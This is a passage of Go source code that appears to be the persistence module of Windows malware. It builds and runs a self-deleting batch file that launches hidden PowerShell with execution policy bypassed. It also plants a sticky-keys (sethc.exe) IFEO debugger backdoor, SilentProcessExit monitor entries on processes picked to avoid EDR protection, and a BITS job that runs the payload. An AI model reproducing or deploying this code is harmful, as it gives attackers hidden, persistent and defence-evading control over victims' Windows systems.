		fmt.Sprintf(`wmic process call create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%s\"" >> "%%LOG%%" 2>&1`, bootstrapPs1),
		``,
		`:DONE`,
		`echo [batch] done %date% %time% >> "%LOG%"`,
		`del "%~f0"`,
	}

	batch := strings.Join(lines, "\r\n") + "\r\n"

	if err := os.WriteFile(batPath, []byte(batch), 0644); err != nil {
		return fmt.Errorf("write batch: %v", err)
	}

	log.Printf("[batch] wrote %s", batPath)

	cmd := exec.Command("cmd.exe", "/c", batPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("start batch: %v", err)
	}

	log.Printf("[batch] cmd.exe started, pid=%d", cmd.Process.Pid)
	return nil
}

func addIFEOSethc(exePath string) error {
	key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()
	return key.SetStringValue("Debugger", exePath)
}

func addSilentProcessExit(exePath string) error {
	// 尝试多个进程名，避开 EDR 保护的 IFEO 条目
	targets := []string{"RuntimeBroker.exe", "backgroundTaskHost.exe", "notepad.exe"}

	for _, target := range targets {
		log.Printf("[SilentProcessExit] trying target: %s", target)

		ifeoPath := fmt.Sprintf(`SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%s`, target)
		key1, _, err := registry.CreateKey(registry.LOCAL_MACHINE, ifeoPath, registry.SET_VALUE)
		if err != nil {
			log.Printf("[SilentProcessExit] IFEO create %s: %v", target, err)
			continue
		}
		if err := key1.SetDWordValue("GlobalFlag", 512); err != nil {
			key1.Close()
			log.Printf("[SilentProcessExit] GlobalFlag %s: %v", target, err)
			continue
		}
		key1.Close()
		log.Printf("[SilentProcessExit] GlobalFlag %s set ok", target)

		spePath := fmt.Sprintf(`SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\%s`, target)
		key2, _, err := registry.CreateKey(registry.LOCAL_MACHINE, spePath, registry.SET_VALUE)
		if err != nil {
			log.Printf("[SilentProcessExit] SPE create %s: %v", target, err)
			continue
		}
		key2.SetDWordValue("ReportingMode", 1)
		key2.SetStringValue("MonitorProcess", exePath)
		key2.Close()
		log.Printf("[SilentProcessExit] %s fully configured", target)
		return nil
	}
	return fmt.Errorf("all targets failed")
}

func addBitsJob(exePath string) error {
	execFallback("bitsadmin", "/create", "SupportSK")

	tempFile := filepath.Join(os.TempDir(), "null.tmp")
	execFallback("bitsadmin", "/addfile", "SupportSK", "http://127.0.0.1/nonexistent", tempFile)

	execFallback("bitsadmin", "/setnotifycmdline", "SupportSK", exePath, "")

	_, err := execFallback("bitsadmin", "/resume", "SupportSK")
	return err
}
